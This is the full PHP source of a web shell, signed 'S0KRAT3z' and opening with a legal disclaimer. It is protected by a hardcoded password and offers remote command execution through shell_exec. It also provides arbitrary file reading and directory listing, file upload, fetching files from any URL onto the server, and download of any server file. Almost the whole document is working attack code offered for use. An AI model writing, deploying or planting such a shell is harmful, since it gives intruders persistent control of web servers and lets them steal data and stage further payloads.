This tool may be used for legal purposes only.  
Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. 
If these terms are not acceptable to you, then do not use this tool. Respectfully, S0KRAT3z.

<?php
session_start();

// Check if the form is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Define the expected password
    $expectedPassword = 'hacker1337'; // Replace 'hacker1337' with your desired password

    // Get the entered password from the form
    $enteredPassword = $_POST['password'];

    // Check if the entered password matches the expected password
    if ($enteredPassword === $expectedPassword) {
        // Password is correct, set the session variable
        $_SESSION['authenticated'] = true;
    } else {
        // Password is incorrect, display an error message
        echo 'Invalid password. Access denied.';
    }
}

// Check if the user is not logged in, display the login form
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ?>

    <h2>Access Requested?</h2>
    <form method="POST" action="">
        <label for="password">Password:</label>
        <input type="password" name="password" id="password" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    // Stop executing the rest of the script
    exit();
}

// Logout functionality
if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
    // Destroy the session and redirect to the login form
    session_destroy();
    header('Location: web_shell.php');
    exit();
}
?>

<b>Remote Code Execution</b> <br />
<form method="GET" action="">
    Command: <input type="text" name="command" size="50" value="<?php if (isset($_GET['command'])) { echo htmlspecialchars($_GET['command']); } ?>" />
    <button type="submit">Go</button>
</form>
<?php
if (isset($_GET['command'])) {
    $command = $_GET['command'];
    echo '<pre>';
    echo 'Command: ' . $command . "\n";
    echo 'Output:' . "\n";
    echo shell_exec($command);
    echo '</pre>';
}
?>

<hr />

<b>Retrieve File/Scan Directory</b> <br />
Current file path: <?php echo __FILE__; ?> <br />
<form method="GET" action="">
    Path: <input type="text" name="path" size="50" value="<?php if (isset($_GET['path'])) { echo $_GET['path']; } ?>" />
    <button type="submit">Go</button>
</form>
<pre>
<?php
if (isset($_GET['path'])) {
    if ($_GET['path'] == '') {
        $path = './';
    } else {
        $path = $_GET['path'];
    }
    echo '<b>Realpath:</b> ' . realpath($_GET['path']) . '<br />';
    echo '<b>Type:</b> ';
    if (is_dir($path)) {
        echo 'Directory <br />';
        foreach (scandir($path) as $data) {
            echo $data . "<br />";
        }
    } else {
        echo 'File <br />';
        print_r(file_get_contents($path));
    }
}
?>

</pre>

<hr />

<b>Upload File From Your Local Machine</b> <br />
<form method="POST" action="" enctype="multipart/form-data">
    File(s): <input type="file" name="uploads[]" multiple="multiple" required="required" />
    <button type="submit">Upload</button>
</form>
<?php
if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
    $total = count($_FILES['uploads']['name']);
    for ($i = 0; $i < $total; $i++) {
        $tmpPath = $_FILES['uploads']['tmp_name'][$i];
        if ($tmpPath != '') {
            $newPath = './' . $_FILES['uploads']['name'][$i];
            if (move_uploaded_file($tmpPath, $newPath)) {
                echo 'Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '<br />';
            } else {
                echo 'Unable to upload ' . $_FILES['uploads']['name'][$i] . '<br />';
            }
        }
    }
}
?>

<hr />

<b>Upload File From URL</b> <br />
<form method="POST" action="">
    Filename to save: <input type="text" name="save_name" size="30" required="required" /> <br />
    URL: <input type="text" name="url" size="50" required="required" />
    <button type="submit">Upload</button>
</form>
<pre>
<?php
if (isset($_POST['save_name']) && isset($_POST['url'])) {
    if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) {
        echo 'Successfully uploaded ' . $_POST['save_name'];
    } else {
        echo 'Unable to upload ' . $_POST['save_name'];
    }
}
?>

</pre>

<hr />

<b>Download File From Web Server</b> <br />
<form method="GET" action="">
    Filename to download: <input type="text" name="download" size="100" required="required" /> <br />
    <button type="submit">Download</button>
</form>

<?php
if (isset($_GET['download'])) {
    $filename = $_GET['download'];
    if (file_exists($filename)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
        header('Content-Length: ' . filesize($filename));
        ob_clean();
        flush();
        readfile($filename);
        exit;
    } else {
        echo 'File does not exist.';
    }
}
?>

<hr />

<b>Logout</b> <br />
<form method="POST" action="">
    <input type="hidden" name="logout" value="true" />
    <button type="submit">Logout</button>
</form>
<pre>
<?php
if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
    // Destroy the session and redirect to the login page
    session_destroy();
    header('Location: web_shell.php');
    exit();
}
?>
</pre>


